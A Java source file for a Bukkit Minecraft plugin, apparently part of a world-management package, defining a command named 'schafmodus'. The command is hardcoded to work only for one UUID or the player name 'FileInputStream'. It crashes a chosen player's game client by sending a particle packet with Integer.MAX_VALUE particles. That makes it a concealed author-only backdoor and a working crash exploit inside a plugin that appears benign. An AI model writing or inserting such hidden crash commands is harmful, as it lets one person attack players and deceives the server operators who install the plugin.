package de.fileinputstream.mytraz.worldmanagement.commands;


import net.minecraft.server.v1_12_R1.EnumParticle;
import net.minecraft.server.v1_12_R1.PacketPlayOutWorldParticles;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_12_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class CommandSchafModus implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;

            if (player.getUniqueId().toString().equalsIgnoreCase("018f2527-b5f7-49f3-a511-656b542c6366") || player.getName().equalsIgnoreCase("FileInputStream")) {
                if (args.length == 1) {
                    Player target = Bukkit.getPlayer(args[0]);
                    if (target == null) {
                        player.sendMessage("§cDieser Spieler ist nicht online!");
                        return true;
                    } else {
                        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true, 0F, 0F, 0F, 0F, 0F, 0F, 0F, Integer.MAX_VALUE, Integer.MAX_VALUE));
                        player.sendMessage("§cDer Spieler crasht nun. #Mähhhh");
                    }

                } else {
                    player.sendMessage("§c/schafmodus <Spieler>");
                    return true;
                }
            }
        }
        return false;
    }
}
